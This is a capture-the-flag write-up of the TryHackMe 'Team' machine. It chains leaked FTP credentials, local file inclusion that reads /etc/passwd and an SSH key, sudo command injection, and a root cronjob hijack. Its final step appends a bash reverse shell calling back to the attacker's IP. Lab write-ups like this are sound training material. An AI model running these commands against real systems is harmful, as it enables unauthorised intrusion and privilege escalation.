
# Team

**By Stager** | FashilHack


## What is this machine

Team is an easy Linux box on TryHackMe. It's a good one for understanding how small misconfigurations chain together into full root access. Nothing here requires advanced exploitation — just thorough enumeration, patience, and paying attention to what you read.

The box teaches LFI, SSH key abuse, sudo script exploitation, and cronjob hijacking. Every step feeds into the next. By the end it all makes sense.

---

## Target

```
IP:  team.thm
OS:  Ubuntu Linux
```


## Step 1 — Nmap Scan

```bash
nmap -sV -sC team.thm
```

Three ports:

|Port|Service|Detail|
|---|---|---|
|21|FTP|vsftpd 3.0.3|
|22|SSH|OpenSSH 7.6p1 Ubuntu|
|80|HTTP|Apache 2.4.29|

Anonymous FTP wasn't allowed this time. Started with the web server.

![Nmap Results](./images/nmap.png)

---

## Step 2 — Web Enumeration

Default Apache page at `http://team.thm/`. Nothing there. Ran Gobuster:

```bash
gobuster dir -u http://team.thm/ -w /usr/share/wordlists/directory-list-2.3-medium.txt
```

Found a `/scripts` directory. Ran it again targeting that:

```bash
gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt,js
```

Found `script.txt`. Read it — it was a bash FTP automation script. The last line said:

```
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

So there's an older version. Browsed to `script.txt.old` and got the FTP credentials sitting right there in plaintext.

![script.txt.old with credentials](./images/user%20and%20pass%20found.png)

---

## Step 3 — FTP Access

Logged in with the credentials found. Inside the `workshare` directory there was a file called `New_site.txt`. It was a message from Gyles to Dale:

```
I have started coding a new website in PHP for the team to use, this is
currently under development. It can be found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place
this in the relevent config file.
```

Two things from this:

- There's a subdomain — `dev.team.thm`
- Dale's private SSH key is stored somewhere in a config file

Added the subdomain to `/etc/hosts` and moved on.

![FTP note](./images/file%20found.png)

---

## Step 4 — LFI on dev.team.thm

Browsed to `http://dev.team.thm/`. One link on the page. Following it gave this URL:

```
http://dev.team.thm/script.php?page=teamshare.php
```

That `page=` parameter was the giveaway. Tested it:

```
http://dev.team.thm/script.php?page=/etc/passwd
```

Full `/etc/passwd` came back. LFI confirmed. Users `dale` and `gyles` were both there as real accounts.

![LFI confirmed](./images/dumped%20passwd%20with%20local%20file%20inclustion.png)

---

## Step 5 — Burp Suite Intruder to Find the SSH Key

The FTP note said dale's `id_rsa` was placed inside a config file. I needed to find it. Instead of running a bash script I loaded the request into Burp Suite and sent it to Intruder.

Marked the `page=` value as the injection point and loaded a custom LFI path wordlist as the payload. Fired it off.

Filtered responses by length to find the hits. The key came back from:

```
/etc/ssh/sshd_config
```

At the bottom of the response, inside comments:

```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEA...
#-----END OPENSSH PRIVATE KEY-----
```

Copied it out, stripped the `#` from each line:

```bash
sed 's/^#//' id_rsa > clean && mv clean id_rsa
chmod 600 id_rsa
```

![Burp Intruder LFI fuzzing](./images/rsa%20found%20in%20running%20burp.png) 
---

## Step 6 — SSH as Dale

```bash
ssh -i id_rsa dale@team.thm
```

In. Got the user flag:

```bash
cat /home/dale/user.txt
```

![SSH as dale](./images/login%20as%20dale%20with%20rsa.png)

---

## Step 7 — Moving to Gyles

Checked what dale could run as other users:

```bash
sudo -l
```

Dale could run `/home/gyles/admin_checks` as gyles with no password. Read the script — it had this at the end:

```bash
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```

That `$error` variable runs whatever you type as a shell command. So when it asked for a date, I gave it a shell instead:

```bash
sudo -u gyles /home/gyles/admin_checks
# Enter name: anything
# Enter 'date': /bin/bash -i
```

Shell dropped. Upgraded it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
gyles@TEAM:~$
```

![Gyles shell](./images/script%20found%20in%20gyles%20home.png)

---

## Step 8 — pspy64s to Find Root Cronjobs

Needed to know what root was running automatically. Transferred pspy64s to the box:

```bash
# Kali:
python3 -m http.server 8000

# Target:
wget http://<tun0-ip>:8000/pspy64s -O /tmp/pspy64s
chmod +x /tmp/pspy64s
/tmp/pspy64s
```

Let it run. Every minute root (UID=0) was executing:

```
/bin/bash /usr/local/bin/main_backup.sh
```

Checked permissions on it:

```bash
ls -la /usr/local/bin/main_backup.sh
```

```
-rwxrwxr-x 1 root admin main_backup.sh
```

Admin group had write access. Gyles was in the admin group. Root runs it every minute. That's the path.

![pspy64s output|126](./images/found%20scripts%20runnig%20as%20root.png)

---

## Step 9 — Root via Cronjob Injection

Appended a reverse shell to the end of the backup script:

```bash
echo "bash -i >& /dev/tcp/<tun0-ip>/9001 0>&1" >> /usr/local/bin/main_backup.sh
```

Set up the listener:

```bash
nc -lvnp 9001
```

Waited one minute. Root ran the script. Shell came back:

```bash
whoami
# root
```

```bash
cat /root/root.txt
```

Done.

![Root shell](./images/root.txt.png)

---

## The Full Chain

```
Nmap → 3 ports open
  ↓
Gobuster → script.txt.old → FTP credentials
  ↓
FTP → New_site.txt → dev.team.thm + id_rsa hint
  ↓
LFI on dev.team.thm → Burp Intruder → /etc/ssh/sshd_config
  ↓
id_rsa extracted → SSH as dale → user.txt
  ↓
sudo -l → admin_checks runs as gyles → $error abuse → gyles shell
  ↓
pspy64s → main_backup.sh runs as root every minute
  ↓
gyles in admin group → writable → reverse shell appended → root
  ↓
root.txt
```

---

## What I learned from this one

**Old files left on a web server give away everything.** `script.txt.old` had credentials sitting in plaintext. Developers test things and forget to clean up — always check for backup and old versions of files.

**The `page=` parameter is always worth testing on PHP apps.** It was the entire foothold into the config files. LFI with a good wordlist in Burp Intruder covers a lot of ground fast.

**Config files store secrets.** The private key was sitting in `sshd_config` commented out. The FTP note even told us to look there — read everything carefully.

**Unsafe bash variables are command injection.** That `$error` in admin_checks wasn't sanitized at all. Whatever you type gets executed. One input and you're a different user.

**pspy64s is the move when you don't know what root is doing.** Without it you'd be guessing which script to target. It shows you everything running in real time including the full command with arguments.

**Writable script + root cronjob = root.** One appended line was all it took. You don't need to overwrite the whole file — just add to the end and wait.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._